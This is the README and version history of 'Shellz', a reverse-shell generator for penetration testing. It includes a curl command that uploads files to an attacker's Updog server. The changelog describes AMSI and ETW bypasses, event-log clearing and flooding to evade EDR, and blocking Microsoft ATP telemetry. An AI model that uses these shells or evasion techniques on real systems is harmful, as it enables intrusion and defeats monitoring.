# Shellz
A script for generating common revshells fast and easy. <br>
Especially nice when in need of PowerShell and Python revshells, which can be a PITA getting correctly formatted.<br><br> 

## PowerShell revshells<br> 
- Shows username@computer.(domain), above the prompt and working-directory
- Has a partial and full AMSI-bypass.
- TCP, UDP and SSL shells 
- New custom TCP revshell!
- New custom SSL revshell!
- Reflective loading [theart42's](https://twitter.com/theart42) <b>amazing</b> [Sharpcat! ](https://github.com/theart42/Sharpcat)
- Windows Powershell and Core Powershell
- Functions for uploading and downloading files. (Using [Updog](https://github.com/sc0tfree/updog) by sc0tfree)

## ngrok support
- ngrok can be started/stopped from inside the script
- payloads will be genereated with the ngrok addresses

## Updog support
- you can start/stop Updog from inside the script
- The PowerShell revshells have upload/download function embedded
- To upload from nix using curl: 
```curl -F path="absolute path for Updog-folder" -F file=filename http://UpdogIP/upload```
 
 
### To install Shells from git
	git clone https://github.com/4ndr34z/shells
	cd shells
	./install.sh
	
### To install shells on BlackArch:
	pacman -S shellz


### Screenshots

![Main](https://github.com/4ndr34z/shells/blob/main/screenshots/macOS162.png?raw=true)
![Netcat](https://github.com/4ndr34z/shells/blob/main/screenshots/netcat1.png?raw=true)
![pwsh](https://github.com/4ndr34z/shells/blob/main/screenshots/pwsh3.png?raw=true)
![screenshot3](https://github.com/4ndr34z/shells/blob/main/screenshots/shells2.png?raw=true)
![screenshot4](https://github.com/4ndr34z/shells/blob/main/screenshots/shells3.png?raw=true)
![screenshot5](https://github.com/4ndr34z/shells/blob/main/screenshots/shells4.png?raw=true)
![screenshot6](https://github.com/4ndr34z/shells/blob/main/screenshots/SimpleRevshell.png?raw=true)

#### Required dependencies
netcat, rlwrap, jq, basenc (coreutils)

#### Optional dependencies
updog, ngrok, xclip

### Youtube video
[Link](https://youtu.be/HDrzqiyKQtA)

## Version 1.6.8
- Filling "Microsoft-Windows-PowerShell/Operational" with even more entries, to be sure to push out the script initial execution. (Only works if scriptblock logging is enabled on target)

## Version 1.6.7
- Had only URL-safe Base64 encoding. Added ordinary base64 encodig of payloads. 

## Version 1.6.6
- Added option for filling powershell-log. It will start a bunch of powershell sessions, passing a long string and exit. This will fill the log, when scriptblock logging is enabled, effectively pushing out earlier log entries and thus removing the event of the shell itself spawning. Could prevent EDR detection. Tested with success on SentinelOne. 
- Fixed confusing menu selections. Removed auto-enter on selecting options on most menus.
- Added Metasploit Multi/handler Listener 

## Version 1.6.5
- Added Powershell ETW-patch
- Added Powershell embedded full AMSI-bypass.
- Added payload length check. The maximum length of the string that you can use at the Windows command prompt (cmd.exe) is 8191 character. 


## Version 1.6.4
- Fixed Powershell SSL-shell

## Version 1.6.3
- Added variable expansion on the powershell payload, making it run from e.g. batch-files without modifying it

## Version 1.6.2
- Renaming to Shellz

## Version 1.6.1
- Listener started in new window. (Optional on Linux)


## Version 1.6
- Powershell: Added option for reflective loading Sharpcat

## Version 1.5.9
- PowerShell: New custom SSL shell
- PowerShell: Added options for choosing TCP/UDP/SSL
- PowerShell/OpenSSL: Defaulting to correct listener when using SSL

## Version 1.5.8
- Updated installer to use wrapper-script (remember to delete /usr/local/bin/shells when upgrading from < 1.5.8)

## Version 1.5.7
- PowerShell: Buildt a unique TCP revshell, that is not using Net.Sockets.TCPClient 
- PowerShell: Remote errormessages now being properly displayed

## Version 1.5.6
- PHP: added options and more payloads


## Version 1.5.5
- Added option on other payloads for changing shell 


## Version 1.5.4
- Powershell: Fixed the NIX payload
- Powershell: Updated the payload for reflective loading C#  


## Version 1.5.3
- Powershell: Added options for payload in menu.


## Version 1.5.2
- PowerShell: Changed revshell for bypassing more AV vendors
- Powershell: Added firewall-rule, preventing MS ATP from phoning home (if the running user has access)
- Powershell: Updated VBA (MS Office Macros)

## Version 1.5.1
- PowerShell: Disabling scriptblock logging and CheckSuspiciousContent
- PowerShell: Clears PowerShell eventlogs (if the running user has access)

### Version 1.5.0
- PowerShell: Added VBA payloads for MS Office Macros
- Added some node.js payloads


### Version 1.4.9
- Added a simple C# shell.  
- Added payload for reflective loading the C# shell into memory. (Needs full AMSI bypass)
- Covering this by adding Rastamouse's full AMSI Bypass
- PowerShell: You can automatically upload and run full AMSI bypass. The partitial AMSI bypass makes this possible.
- C# Shell: Automatically upload and run full AMSI bypass before loading it into memory
- Updog and ngrok status showing in every menu


### Version 1.4.8
- Sometimes less is more. Removed the obfuscating on TCP/UDP PowerShell revshells, because it actually triggers AV more than it bypasses and the payload got really big :-) Still using randomization.


### Version 1.4.6
- Added webshells (ASPX, PHP, JSP)


### Version 1.4.5
- Added 2 c++ revshell binaries for Windows 32 and 64 bit. 


### Version 1.4.4
- Fixed the handling of starting/stopping Updog


### Version 1.4.3
- Added Updog support
- Added Netcat binaries. 
- Powershell: Created upload/download functionality (upload requires Updog for receiving files)
- Added more information about running ngrok and Updog. 

### Version 1.4.2
- PowerShell: Added a new "mini AMSI-bypass". (It is a partial bypass) Based on Matt Graebers Reflection method 
- PowerShell: Added a "upload" function in the Powershell reverseshell

### Version 1.4.1
- Removed AMSI. Not tested enough :-)


### Version 1.4
- Added AMSI-bypass for the powershell payloads

### Version 1.3.9
- Fixed bug when setting port
- Changed default port to 443
- PowerShell: obfuscated some more


### Version 1.3.8
- PowerShell: Minor changes to the UDP payload


### Version 1.3.7
- Using only native nc on macOS, because the one on homebrew doesn't work on incoming UDP
- PowerShell: Added UDP payloads


### Version 1.3.6
- PowerShell: Added more payloads


### Version 1.3.5
- PowerShell: Added some randomization and obfuscation for the payload


### Version 1.3.4
- PowerShell: Using UTF8 encoding in payload


### Version 1.3.3
- Added Golang


### Version 1.3.2
- Added OpenSSL


### Version 1.3.1
- Fixed bug in Python revshell
- Added awk
- Added Bash UDP 


### Version 1.3
- Added Windows Python revshells


### Version 1.2.9
- Added a ngrok running-status


### Version 1.2.8
- Hiding ngrok choice if not installed


### Version 1.2.7
- Fixed the install options: not doing default option when pressing enter without making a choice


### Version 1.2.6
- Added support for ngrok. 


### Version 1.2.4
- Added a install-script
- Added install options for checking and installing missing dependencies


### Version 1.2.3
- Added a couple of PHP shells


### Version 1.2.2
- Added shells for: Ruby, Perl, Telnet and zsh


### Version 1.2.1
- Added copy to clipboard using pbcopy on macOS
- Added info about listening netcat as the macOS versions doesn't display that


### Version 1.2
- Added looping netcat shells. Calls back every 10 seconds. Great in case you loose your shell
- Added check for netcat GNU netcat 0.7.0 Homebrew when running on macOS


### Version 1.1
- Added support for macOS
